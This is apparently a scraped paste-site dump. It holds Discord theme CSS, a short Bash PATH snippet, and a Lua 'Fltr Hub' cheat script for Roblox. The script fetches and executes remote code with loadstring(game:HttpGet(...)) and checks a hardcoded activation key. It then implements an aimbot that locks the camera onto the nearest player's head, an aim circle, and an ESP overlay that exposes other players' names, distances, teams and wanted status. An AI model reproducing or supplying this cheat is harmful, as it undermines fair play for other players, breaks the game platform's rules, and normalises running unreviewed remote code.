.bottomDivider__01014{border-bottom-color:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .codeRedemptionRedirect_a706ba{background:var(--hsl-card-shading);border:none}.container__06283{-webkit-mask-image:url(https://clearvision.github.io/icons/pill.svg);mask-image:url(https://clearvision.github.io/icons/pill.svg);background:var(--hsl-main-color) !important}:is(.theme-light,.theme-dark) .progress__06283{background:var(--hsl-background-shading)}.notches__06283{display:none}:is(.theme-light,.theme-dark) .sliderBar_ac7648{background-color:var(--background-modifier-accent)}.soundButtonSettingContainer__84bad{background:var(--hsl-card-shading)}.cameraWrapper_d41d5f{background:var(--hsl-card-shading);border:none}.backgroundOptionRing__53965{border:2px solid var(--hsl-main-color)}.notDetected_cc46f0{background:var(--hsl-card-shading)}.nowPlaying_cc46f0{background:hsl(from ""color.success"" h s l/0.8)}.addGamePopout_cc46f0{background:var(--hsl-popout-shading);box-shadow:none}:is(.theme-light,html:not(.theme-dark)) .game_cc46f0{box-shadow:0 1px 0 0 var(--background-modifier-accent)}.expandedContainer__9d98d,.groupHeader__9d98d,.groupCollapsedContainer__9d98d,.groupContainer__9d98d{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.settingCard__1a4ef,.settingCard__1a4ef.active__1a4ef{background:var(--hsl-card-shading)}.cardFolder__1a4ef{background:rgba(0,0,0,0)}.scroller__53543{background:rgba(0,0,0,0)}.container_d5ae15{background:var(--hsl-popout-shading)}.header_d5ae15{background:var(--hsl-input-shading)}.group__344e6{border-color:var(--background-modifier-accent)}.item__344e6{background:var(--hsl-card-shading);cursor:pointer}.item__344e6.selected__344e6{background-color:hsl(from var(--hsl-main-color) h s l/0.4)}.deny__344e6{color:var(--hsl-danger-color);border-right:1px solid var(--background-modifier-accent)}.deny__344e6.selected__344e6{background-color:hsl(from var(--hsl-danger-color) h s l/0.6)}.allow__344e6{color:var(--hsl-success-color);border-left:1px solid var(--background-modifier-accent)}.allow__344e6.selected__344e6{background-color:hsl(from var(--hsl-success-color) h s l/0.6)}/*! ClearVision v7.0.1 by ClearVision Team */.itemSelected_ec9088{border:2px solid var(--hsl-main-color)}.traitContainer__4cbea{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.traitContainer__4cbea:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.emojiWrapper__4cbea{border:none;padding-left:10px}.traitInput__4cbea{background:rgba(0,0,0,0);box-shadow:none;height:32px}.traitInput__4cbea:focus-within{box-shadow:none}.wrapper__83b1d,.wrapper__83b1d:hover{background:rgba(0,0,0,0)}.action__83b1d{background:var(--hsl-popout-shading)}.mainTableContainer_fa2640{background:var(--hsl-card-shading)}.visual-refresh .container_d8f25b{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .container_d8f25b:hover{background:var(--hsl-card-shading);border:2px solid var(--hsl-main-color)}.icon_d8f25b{background:var(--hsl-main-color);color:var(--interactive-active)}.circleButton__5f97b{margin-left:10px}.roleRow__5f97b:hover:not(.roleRowDisableHover__5f97b) .circleButton__5f97b{background:var(--hsl-card-shading)}.roleRow__5f97b:hover:not(.roleRowDisableHover__5f97b) .circleButton__5f97b:hover{background:var(--hsl-main-color)}.titleContainer_e29cd7{background:rgba(0,0,0,0)}.header_c6bf1b{background:rgba(0,0,0,0);transition:background .15s ease-in-out}.stickyHeaderElevated_c6bf1b{background:var(--hsl-popout-shading)}.container__09ccc{background:var(--hsl-popout-shading)}.joinOptions__959cb{background:var(--hsl-card-shading)}.joinOptionContent__959cb.active__959cb{background:var(--background-modifier-accent)}.visual-refresh .changelog_abe1fa,.visual-refresh .safetyChecklist_eae0ef,.visual-refresh .simpleItemWrapper__5dac8{background:var(--hsl-card-shading);border:none}.valuePill__5dac8{background:var(--hsl-card-shading);border:1px solid var(--hsl-main-color)}.visual-refresh .auditLog__43dab{background:var(--hsl-card-shading);border:none}.visual-refresh :is(.headerExpanded__43dab,.divider__43dab,.changeDetails__43dab){background:rgba(0,0,0,0)}.visual-refresh .scrollerContainer_cdb2b0{background:var(--hsl-card-shading);border:none}.textBadge__0034b{border-color:rgba(0,0,0,0)}.visual-refresh .editCard_a25a68{background:var(--hsl-card-shading);border:none}.visual-refresh :is(.mentionLimitContainer_ed9c90,.keywordListContainer__09e76,.actionContainer__6446f){background:var(--background-modifier-accent)}.visual-refresh .keywordsTextArea__6a631{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .keywordsTextArea__6a631:focus{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.actionContainer_bc4513,.stepCountIcon_b6c6eb{background:var(--background-modifier-accent)}.stepperContainer_ed9c90{background:rgba(0,0,0,0);border:none}.textArea_c615b7{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.textArea_c615b7:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.guildDetails_bebc5b{background:var(--hsl-popout-shading)}.featureCard_bebc5b{background:var(--hsl-card-shading)}.featureIcon_bebc5b{background:rgba(0,0,0,0)}.visual-refresh .upsellContainer__4cfe2{background:var(--hsl-card-shading)}.visual-refresh .upsellFooter__4cfe2{background:rgba(0,0,0,0)}.howItWorksContainer_dd30dc{background:rgba(0,0,0,0);padding:0}.howItWorksImageContainer_dd30dc{background:rgba(0,0,0,0)}.card_fc2e20{background:var(--hsl-card-shading)}.avatarCard__02e4c{background:var(--background-modifier-accent)}:is(.verticalConnector__02e4c,.horizontalConnector__02e4c){border-color:var(--background-modifier-accent) !important}.viewServerButton__2485e{background:var(--hsl-main-color)}.viewServerButton__2485e:hover{background:var(--hsl-hover-color)}.visual-refresh .tier_f15dca{border:none}.visual-refresh .tierHeader_f15dca,.visual-refresh .tierBody_f15dca{background:var(--hsl-card-shading);border:none}.descriptionBox__981f7{background:var(--hsl-card-shading)}.developerPortalCtaWrapper_bf485f{background:rgba(0,0,0,0)}.analyticsCard__5931c{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .panels_c48ade{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5));border-radius:0;border:none;width:100%;left:0;bottom:0;padding:8px}:is(.theme-light,.theme-dark) .panel__5dec7{background-color:rgba(0,0,0,0)}.visual-refresh .button_e131a9.buttonColor_e131a9{background:var(--hsl-main-color)}.visual-refresh .button_e131a9.buttonColor_e131a9:hover{background:var(--hsl-hover-color)}.visual-refresh .button_e131a9.buttonColor_e131a9.buttonActive_e131a9{background:hsl(from var(--hsl-main-color) h s l/0.4);color:var(--button-secondary-text);border-color:hsl(from var(--hsl-main-color) h s l/0.2)}.visual-refresh .button_e131a9.buttonColor_e131a9.buttonActive_e131a9:hover{background:hsl(from var(--hsl-hover-color) h s l/0.3)}.noiseCancellationPopout_e131a9{background:var(--hsl-popout-shading)}:is(.theme-light,.theme-dark) .wrapper__0d616{background:rgba(0,0,0,0)}.contentWrapper__0d616{background:none !important}.postEnrollmentBackgroundCollapsed__636a2,.postEnrollmentBackgroundExpanded__636a2{background-image:none !important;background-color:rgba(0,0,0,0);border:none}.headerText__636a2,.submenuIcon__636a2{color:rgba(0,0,0,0)}.contentInteractable__636a2 .postEnrollmentBackgroundExpanded__636a2{background-color:var(--hsl-popout-shading)}.contentInteractable__636a2 .headerText__636a2{color:var(--text-normal)}.contentInteractable__636a2 .submenuIcon__636a2{color:var(--interactive-normal)}/*! ClearVision v7.0.1 by ClearVision Team */.keyboard-mode .focusStroke_cc5dd2{stroke:var(--focus-color);stroke-width:4px}.visual-refresh .guilds_c48ade{margin-bottom:var(--custom-app-panels-height);background:rgba(0,0,0,0);padding-top:10px}.item__58105{box-shadow:0 0 3px 1px var(--hsl-main-color)}.pill__5bc7e{bottom:0}.visual-refresh .childWrapper__6e9f8{background-color:var(--hsl-card-shading)}.visual-refresh .childWrapper__6e9f8>svg{width:100%;height:100%;background:var(--home-icon) center/var(--home-size) no-repeat}.visual-refresh .childWrapper__6e9f8 path{display:none}.wrapper__6e9f8:hover .childWrapper__6e9f8{background-color:var(--hsl-hover-color)}.wrapper__6e9f8.selected__6e9f8 .childWrapper__6e9f8{background-color:var(--hsl-main-color)}.icon__6e9f8{background-color:var(--hsl-card-shading)}.visual-refresh .expandedFolderBackground__48112{background:var(--hsl-card-shading)}.circleIconButton__5bc7e{background-color:var(--hsl-card-shading)}.circleIconButton__5bc7e.selected__5bc7e{background:var(--hsl-main-color)}.visual-refresh .circleIconButton__5bc7e:hover:not(.disabled__5bc7e){background:var(--hsl-hover-color)}.mention__3b95d{background:var(--hsl-main-color);border-radius:5px}.mention__3b95d:active{background:var(--hsl-main-color)}.iconBadge__2b1f5{background:var(--hsl-popout-shading)}.iconBadge__2b1f5.isCurrentUserConnected__650eb{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapperCommon__29444 .mainContent__29444 .name__29444{flex:1}.visual-refresh .name__29444{display:flex;align-items:center;justify-content:center;color:var(--hsl-main-color);font-weight:700}.visual-refresh .name__29444::before{content:"""";height:2px;flex-grow:1;transition:all .3s ease-in-out;background:linear-gradient(to left, var(--hsl-main-color) 50%, transparent);margin-right:5px}.visual-refresh .name__29444::after{content:"""";height:2px;flex-grow:1;transition:all .3s ease-in-out;background:linear-gradient(to right, var(--hsl-main-color) 50%, transparent);margin-left:5px}.visual-refresh .children__29444{margin-left:6px}.visual-refresh .addButtonIcon__29444{color:var(--hsl-main-color)}.collapsed__29444 .name__29444::before,.collapsed__29444 .name__29444::after{flex-grow:0}.wrapper__29444.muted__29444 :is(.name__29444,.addButtonIcon__29444){color:var(--hsl-main-color);opacity:.5}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444{color:var(--hsl-hover-color)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444::before{background:linear-gradient(to left, var(--hsl-hover-color) 50%, transparent)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .name__29444::after{background:linear-gradient(to right, var(--hsl-hover-color) 50%, transparent)}.wrapper__29444:is(.wrapper__29444,.muted__29444):hover .addButtonIcon__29444{color:var(--hsl-hover-color)}.icon__29444{display:none}/*! ClearVision v7.0.1 by ClearVision Team */.newChannel__599fa{background:var(--hsl-main-color) !important;color:var(--header-primary)}.visual-refresh .sidebarList_c48ade{margin-bottom:var(--custom-app-panels-height);border-top-left-radius:10px;border:none;-webkit-backdrop-filter:none;backdrop-filter:none}.visual-refresh .container__2637a{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2));padding:0}.visual-refresh .animatedContainer_f37cb1{background-color:rgba(0,0,0,0);border:none}.visual-refresh .unread__2ea32{box-shadow:0 0 6px 1px var(--hsl-main-color)}.visual-refresh .bottom__7aaec,.visual-refresh .unreadBottom__629e4{bottom:8px}.visual-refresh .bar__7aaec,.visual-refresh .bar__3b95d{background-color:var(--hsl-main-color);border-color:var(--hsl-main-color)}.visual-refresh .unreadIcon__7aaec,.visual-refresh .barText__7aaec{color:var(--button-filled-brand-text) !important}.spineBorder__5b40b{background-color:var(--hsl-main-color)}.spine__5b40b{color:var(--hsl-main-color)}.link__2ea32{transition:all .15s ease-in-out;margin-left:4px}.link__2ea32::before{top:0;right:100%;bottom:0;left:0;transition:all .15s ease-in-out;z-index:-1;border-radius:4px}.icon__2ea32{width:18px;height:18px;margin-right:3px;transition:all .15s ease-in-out;color:var(--hsl-channel-normal)}.name__2ea32{transition:all .15s ease-in-out;color:var(--hsl-channel-normal)}.wrapper__2ea32.modeMuted__2ea32 .name__2ea32,.wrapper__2ea32.modeMuted__2ea32 .icon__2ea32{color:var(--hsl-channel-muted)}.wrapper__2ea32:hover .link__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .link__2ea32{background:var(--background-modifier-accent)}.wrapper__2ea32:hover .name__2ea32,.wrapper__2ea32:hover .icon__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .name__2ea32,.wrapper__2ea32.modeMuted__2ea32:hover .icon__2ea32{color:var(--hsl-channel-hover)}.wrapper__2ea32.modeUnreadImportant__2ea32 .name__2ea32{color:var(--hsl-channel-unread);text-shadow:0 0 3px}.wrapper__2ea32.modeUnreadImportant__2ea32 .icon__2ea32{color:var(--hsl-channel-unread);filter:drop-shadow(0 0 3px)}.wrapper__2ea32.modeUnreadImportant__2ea32:hover :is(.name__2ea32,.icon__2ea32){color:var(--hsl-channel-unread-hover)}.wrapper__2ea32.modeSelected__2ea32 .link__2ea32{background-color:rgba(0,0,0,0)}.wrapper__2ea32.modeSelected__2ea32 .link__2ea32::before{right:0;background:var(--hsl-channel-selected-bg);animation:cv-channel-select .3s ease-in-out}.wrapper__2ea32.modeSelected__2ea32 .name__2ea32,.wrapper__2ea32.modeSelected__2ea32 .icon__2ea32{color:var(--hsl-channel-selected)}.wrapper__2ea32.modeConnected__2ea32 .name__2ea32{color:var(--hsl-main-color);text-shadow:0 0 3px}.wrapper__2ea32.modeConnected__2ea32 .icon__2ea32{color:var(--hsl-main-color);filter:drop-shadow(0 0 3px)}.visual-refresh .wrapper__260e1,.visual-refresh .users__260e1{background:rgba(0,0,0,0)}.visual-refresh .users__260e1{padding:0 8px 0 6px}.visual-refresh .total__260e1{padding:0 6px 0 1px}.list_c3cd7d{padding-left:24px}.voiceUser__07f91{z-index:1}.voiceUser__07f91 .content__07f91{border-radius:3px;transition:all .15s ease-in-out}.voiceUser__07f91 .avatarSpeaking__07f91{box-shadow:0 0 0 2px var(--hsl-main-color),inset 0 0 3px rgba(0,0,0,.5);position:relative;transition:all .1s ease-in-out}.voiceUser__07f91 .avatarSpeaking__07f91:after{content:"""";top:-2px;bottom:-2px;width:150px;position:absolute;height:1.8em;background:linear-gradient(to right, var(--hsl-main-color) 10%, transparent);opacity:.5;transition:all .1s ease-in-out,width .15s ease-in-out;pointer-events:none;z-index:-1;border-radius:999px;border-top-right-radius:0;border-bottom-right-radius:0}.voiceUser__07f91 .username__07f91{color:hsla(0,0%,100%,.5);transition:all .1s ease-in-out}.voiceUser__07f91 .usernameSpeaking__07f91{color:#fff}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .privateChannels__35e86{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .scroller__99e7c{background:rgba(0,0,0,0);margin:0}.visual-refresh .privateChannelsHeaderContainer__99e7c{color:var(--hsl-main-color)}.visual-refresh .headerText__99e7c{display:flex;text-transform:uppercase;font-size:14px;font-weight:700;align-items:center}.visual-refresh .headerText__99e7c::before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, currentColor 50%, transparent);margin-right:5px}.visual-refresh .headerText__99e7c::after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, currentColor 50%, transparent);margin-left:5px}.visual-refresh :is(.plusIcon__675e5,.privateChannelRecipientsInviteButtonIcon__99e7c){color:var(--hsl-main-color)}.visual-refresh :is(.plusIcon__675e5,.privateChannelRecipientsInviteButtonIcon__99e7c):hover{color:var(--hsl-hover-color)}.empty__99e7c{fill:var(--text-normal);opacity:.15}.visual-refresh .interactive__972a0{transition:all .15s ease-in-out;border-radius:4px}.visual-refresh .interactive__972a0::before{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;transition:all .15s ease-in-out;z-index:-1;border-radius:4px}.visual-refresh .interactive__972a0:hover{background:var(--background-modifier-accent)}.visual-refresh .interactive__972a0.interactiveSelected__972a0{background-color:rgba(0,0,0,0);color:var(--interactive-active)}.visual-refresh .interactive__972a0.interactiveSelected__972a0::before{right:0;background:var(--hsl-main-color);animation:cv-channel-select .3s ease-in-out}.visual-refresh .interactive__972a0.interactiveSelected__972a0 .activityStatusText__972a0{color:var(--interactive-active)}.visual-refresh .interactive__972a0.interactiveSelected__972a0 .activityStatusText__972a0 strong{color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */.platform-win .sidebar_c48ade{border-radius:0}.visual-refresh .sidebar_c48ade{background:rgba(0,0,0,0)}.visual-refresh .sidebar_c48ade:after{display:none}:is(.theme-light,.theme-dark,.theme-darker,.theme-midnight),:is(.theme-light,.theme-dark,.theme-darker,.theme-midnight):is(.theme-light,.theme-dark){--text-normal: hsl(from var(--normal-text) h calc(var(--saturation-factor, 1) * s) l/alpha);--text-muted: hsl(from var(--muted-text) h calc(var(--saturation-factor, 1) * s) l/alpha);--text-link: var(--hsl-main-color);--text-brand: var(--hsl-main-color);--text-positive: var(--hsl-success-color);--text-danger: var(--hsl-danger-color);--hsl-background-shading: hsl(from var(--background-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-card-shading: hsl(from var(--card-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-popout-shading: hsl(from var(--popout-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-modal-shading: hsl(from var(--modal-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-input-shading: hsl(from var(--input-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-input-border-shading: hsl(from var(--hsl-input-shading) h s l/.1)}:root{--hsl-main-color: hsl(from var(--main-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-hover-color: hsl(from var(--hover-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-success-color: hsl(from var(--success-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-warning-color: hsl(from var(--warning-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-danger-color: hsl(from var(--danger-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-info-color: hsl(from var(--info-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-online-color: hsl(from var(--online-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-idle-color: hsl(from var(--idle-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-dnd-color: hsl(from var(--dnd-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-streaming-color: hsl(from var(--streaming-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-offline-color: hsl(from var(--offline-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-channel-normal: var(--channel-normal);--hsl-channel-muted: var(--channel-muted);--hsl-channel-hover: var(--channel-hover);--hsl-channel-selected: var(--channel-selected);--hsl-channel-selected-bg: var(--channel-selected-bg);--hsl-channel-unread: var(--channel-unread);--hsl-channel-unread-hover: var(--channel-unread-hover);--font-primary: var(--main-font);--font-display: var(--main-font);--font-code: var(--code-font);--focus-primary: var(var(--focus-color));--main-color: #2780e6;--hover-color: #1e63b3;--success-color: #43b581;--warning-color: #fff;--danger-color: #982929;--info-color: #fff;--online-color: #43b581;--idle-color: #faa61a;--dnd-color: #982929;--streaming-color: #593695;--offline-color: #808080;--background-shading-percent: 100%;--background-image: url(https://clearvision.github.io/images/sapphire.jpg);--background-position: center;--background-size: cover;--background-attachment: fixed;--background-filter: saturate(calc(var(--saturation-factor, 1) * 1));--user-popout-image: var(--background-image);--user-popout-position: var(--background-position);--user-popout-size: var(--background-size);--user-popout-attachment: var(--background-attachment);--user-popout-filter: var(--background-filter);--user-modal-image: var(--background-image);--user-modal-position: var(--background-position);--user-modal-size: var(--background-size);--user-modal-attachment: var(--background-attachment);--user-modal-filter: var(--background-filter);--home-icon: url(https://clearvision.github.io/icons/discord.svg);--home-size: cover;--main-font: ""gg sans"", Whitney, ""Helvetica Neue"", Helvetica, Arial, sans-serif;--code-font: Consolas, ""gg mono"", ""Liberation Mono"", Menlo, Courier, monospace;--channel-normal: var(--interactive-normal);--channel-muted: var(--interactive-muted);--channel-hover: var(--interactive-hover);--channel-selected: var(--interactive-active);--channel-selected-bg: var(--main-color);--channel-unread: var(--main-color);--channel-unread-hover: var(--hover-color);--focus-color: var(--main-color)}:is(.theme-light,.theme-dark .theme-light){--background-shading: rgba(252, 252, 252, 0.3);--card-shading: rgba(252, 252, 252, 0.3);--popout-shading: rgba(252, 252, 252, 0.7);--modal-shading: rgba(252, 252, 252, 0.5);--input-shading: rgba(0, 0, 0, 0.3);--normal-text: #36363c;--muted-text: #75757e}:is(.theme-dark,.theme-light .theme-dark){--background-shading: rgba(0, 0, 0, 0.4);--card-shading: rgba(0, 0, 0, 0.2);--popout-shading: rgba(0, 0, 0, 0.6);--modal-shading: rgba(0, 0, 0, 0.4);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #d8d8db;--muted-text: #aeaeb4}:is(.theme-darker,.theme-light .theme-darker){--background-shading: rgba(0, 0, 0, 0.6);--card-shading: rgba(0, 0, 0, 0.3);--popout-shading: rgba(0, 0, 0, 0.7);--modal-shading: rgba(0, 0, 0, 0.5);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #fbfbfb;--muted-text: #94949c}:is(.theme-midnight,.theme-light .theme-midnight){--background-shading: rgba(0, 0, 0, 0.8);--card-shading: rgba(0, 0, 0, 0.4);--popout-shading: rgba(0, 0, 0, 0.8);--modal-shading: rgba(0, 0, 0, 0.6);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #dcdcde;--muted-text: #86868e}"
tEVL9TWj,Addings,cydside,Bash,Tuesday 17th of June 2025 10:59:04 AM CDT,"export HISTCONTROL=ignoreboth:erasedup
export PATH=$PATH:/usr/local/go/bin
export PATH=$PATH:/home/cyd/go/bin

profile
export PATH=$PATH:/usr/local/go/bin

minify v2.21.3
https://github.com/tdewolff/minify/releases?page=2"
MM4a776e,Untitled,zn4v_,Lua,Tuesday 17th of June 2025 10:37:30 AM CDT,"local OrionLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/jensonhirst/Orion/main/source""))()
local Players = game:GetService(""Players"")
local player = Players.LocalPlayer

-- مفتاح التفعيل الصحيح
local correctKey = ""XlCOw-5mcj3q3yo-2Teff0b34""

-- نافذة طلب مفتاح التفعيل
local KeyWindow = OrionLib:MakeWindow({
    Name = ""Fltr Hub - Activation"",
    HidePremium = true,
    SaveConfig = false,
    IntroEnabled = false,
    NoClose = true,
})

local keyValid = false

KeyWindow:MakeTab({
    Name = ""Activation"",
}):AddTextbox({
    Name = ""Enter Key"",
    PlaceholderText = ""ادخل مفتاح التفعيل هنا"",
    Callback = function(inputKey)
        if inputKey == correctKey then
            keyValid = true
            OrionLib:MakeNotification({
                Name = ""Success"",
                Content = ""تم التفعيل بنجاح! جاري فتح الواجهة..."",
                Image = ""rbxassetid://4483345998"",
                Time = 3
            })
            KeyWindow:Destroy() -- إغلاق نافذة التفعيل
        else
            OrionLib:MakeNotification({
                Name = ""Error"",
                Content = ""المفتاح غير صحيح، حاول مرة أخرى."",
                Image = ""rbxassetid://4483345998"",
                Time = 3
            })
        end
    end,
})

-- نوقف تنفيذ السكربت حتى يدخل المستخدم المفتاح الصحيح
repeat
    wait()
until keyValid

-- الآن يستمر السكربت الأصلي (واجهة الـ Hub)
-- Fltr Hub | Created by Majid (مجودي)
-- تم تجميع السكربتات كاملة بدون روابط

-- المكتبات والخدمات
local OrionLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/jensonhirst/Orion/main/source""))()
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local player = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- واجهة الهب
local Window = OrionLib:MakeWindow({
Name = ""Fltr Hub"",
HidePremium = false,
SaveConfig = true,
ConfigFolder = ""FltrHubConfig"",
IntroEnabled = true,
IntroText = ""Welcome to Fltr Hub 💀"",
Icon = ""rbxassetid://4483345998"",
IntroIcon = ""rbxassetid://4483345998""
})


---

-- 🎯 Aimbot Tab

local AimbotTab = Window:MakeTab({ Name = ""🎯 Aimbot"", Icon = """", PremiumOnly = false })

local aimbotEnabled = false
local aimButtonGui

AimbotTab:AddButton({
Name = ""🔫 تفعيل Aimbot"",
Callback = function()
aimbotEnabled = not aimbotEnabled

if aimButtonGui == nil then  
		aimButtonGui = Instance.new(""ScreenGui"", game.CoreGui)  
		local btn = Instance.new(""TextButton"", aimButtonGui)  
		btn.Size = UDim2.new(0, 150, 0, 40)  
		btn.Position = UDim2.new(0.5, -75, 0.9, 0)  
		btn.Text = ""Aimbot: OFF""  
		btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
		btn.TextColor3 = Color3.new(1, 1, 1)  
		btn.TextSize = 18  
		btn.MouseButton1Click:Connect(function()  
			aimbotEnabled = not aimbotEnabled  
			btn.Text = aimbotEnabled and ""Aimbot: ON"" or ""Aimbot: OFF""  
		end)  
	end  

	RunService.RenderStepped:Connect(function()  
		if aimbotEnabled then  
			local closest, dist = nil, math.huge  
			for _, p in pairs(Players:GetPlayers()) do  
				if p ~= player and p.Character and p.Character:FindFirstChild(""Head"") then  
					local mag = (p.Character.Head.Position - player.Character.Head.Position).Magnitude  
					if mag < dist then  
						closest = p  
						dist = mag  
					end  
				end  
			end  
			if closest then  
				Camera.CFrame = CFrame.new(Camera.CFrame.Position, closest.Character.Head.Position)  
			end  
		end  
	end)  
end

})

local circleVisible, circleRadius = false, 100
local circleObj

AimbotTab:AddToggle({
Name = ""⭕ إظهار دائرة التصويب"",
Default = false,
Callback = function(val)
circleVisible = val
if val then
circleObj = Drawing.new(""Circle"")
circleObj.Thickness = 2
circleObj.Radius = circleRadius
circleObj.Color = Color3.new(1, 0, 0)
circleObj.Filled = false
circleObj.Visible = true
RunService.RenderStepped:Connect(function()
if circleVisible and circleObj then
circleObj.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
end
end)
elseif circleObj then
circleObj:Remove()
circleObj = nil
end
end
})

AimbotTab:AddTextbox({
Name = ""🎯 حجم الدائرة"",
Default = ""100"",
Callback = function(val)
local num = tonumber(val)
if num and circleObj then
circleObj.Radius = num
end
end
})

AimbotTab:AddButton({
Name = ""🌈 تغيير لون الدائرة (RGB)"",
Callback = function()
spawn(function()
while circleVisible and circleObj do
for i = 0, 1, 0.01 do
circleObj.Color = Color3.fromHSV(i, 1, 1)
wait()
end
end
end)
end
})

AimbotTab:AddButton({
Name = ""🎯 تصغير مؤشر السلاح"",
Callback = function()
if player.PlayerGui:FindFirstChild(""Crosshair"") then
player.PlayerGui.Crosshair.Size = UDim2.new(0, 15, 0, 15)
end
end
})

local ESPTab = Window:MakeTab({
    Name = ""👁️ ESP"",
    Icon = """",
    PremiumOnly = false
})

local function isWanted(player)
    -- تحقق من وجود leaderstats.Wanted وقيمته أكبر من 0
    local stats = player:FindFirstChild(""leaderstats"")
    if stats and stats:FindFirstChild(""Wanted"") then
        local val = tonumber(stats.Wanted.Value)
        return val and val > 0
    end
    return false
end

local function createESP(target)
    if not target.Character then return end
    local head = target.Character:FindFirstChild(""Head"")
    if not head or head:FindFirstChild(""ESP_Info"") then return end

    local bill = Instance.new(""BillboardGui"", head)
    bill.Name = ""ESP_Info""
    bill.Size = UDim2.new(0, 150, 0, 80)
    bill.AlwaysOnTop = true
    bill.LightInfluence = 0
    bill.StudsOffset = Vector3.new(0, 2.5, 0)

    local function makeLabel(posY)
        local label = Instance.new(""TextLabel"", bill)
        label.Size = UDim2.new(1, 0, 0, 15)
        label.Position = UDim2.new(0, 0, 0, posY)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextSize = 13
        label.Font = Enum.Font.Gotham
        label.TextStrokeTransparency = 0.5
        label.TextWrapped = true
        label.Text = """"
        return label
    end

    local nameLabel = makeLabel(0)
    local userLabel = makeLabel(15)
    local distLabel = makeLabel(30)
    local teamLabel = makeLabel(45)
    local statusLabel = makeLabel(60)

    nameLabel.Text = target.Name
    userLabel.Text = ""@"" .. target.Name

    local RunService = game:GetService(""RunService"")
    local updater = RunService.RenderStepped:Connect(function()
        if target.Character and target.Character:FindFirstChild(""Head"") and player.Character and player.Character:FindFirstChild(""Head"") then
            local dist = (target.Character.Head.Position - player.Character.Head.Position).Magnitude
            distLabel.Text = ""Distanz: "" .. math.floor(dist) .. "" studs""

            -- الفريق
            if target.Team then
                local team = tostring(target.Team):lower()
                teamLabel.Text = target.Team.Name
                if team == ""police"" then
                    teamLabel.TextColor3 = Color3.fromRGB(0, 0, 255)
                elseif team == ""criminals"" then
                    teamLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                else
                    teamLabel.TextColor3 = Color3.new(1, 1, 1)
                end
            else
                teamLabel.Text = ""Unknown""
                teamLabel.TextColor3 = Color3.new(1, 1, 1)
            end

            -- الحالة المطلوب
            if isWanted(target) then
                statusLabel.Text = ""Wanted""
                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            else
                statusLabel.Text = ""Not Wanted""
                statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
        end
    end)

    bill.AncestryChanged:Connect(function()
        if not bill:IsDescendantOf(game) then
            updater:Disconnect()
        end
    end)
end

-- إضافة ESP للاعبين الموجودين
for _, p in pairs(Players:GetPlayers()) do
    if p ~= player then
        p.CharacterAdded:Connect(function()
            wait(1)
            createESP(p)
        end)
        if p.Character then
            createESP(p)
        end
    end
end

-- إضافة لأي لاعب جديد
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        wait(1)
        createESP(plr)
    end)
end)

-- إضافة ESP للاعبين الموجودين
for _, p in pairs(Players:GetPlayers()) do
    if p ~= player then
        p.CharacterAdded:Connect(function()
            wait(1)
            createESP(p)
        end)
        if p.Character then
            createESP(p)
        end
    end
end

-- للاعبين الجدد
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        wait(1)
        createESP(plr)
    end)
end)
-- 🧍 Player Tab

